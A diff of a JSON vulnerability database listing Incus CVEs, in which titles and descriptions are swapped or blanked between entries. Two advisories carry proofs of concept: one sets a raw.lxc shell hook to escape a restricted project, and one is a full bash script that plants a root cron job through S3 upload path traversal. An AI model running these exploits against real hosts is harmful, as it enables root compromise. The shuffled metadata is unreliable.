+                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1609,8 +1609,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1622,8 +1622,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
-                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1936,8 +1936,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
+                "description": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1962,8 +1962,8 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1975,8 +1975,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution",
+                "description": "### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -2001,8 +2001,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -2014,8 +2014,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -2027,8 +2027,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -2040,8 +2040,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
-                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
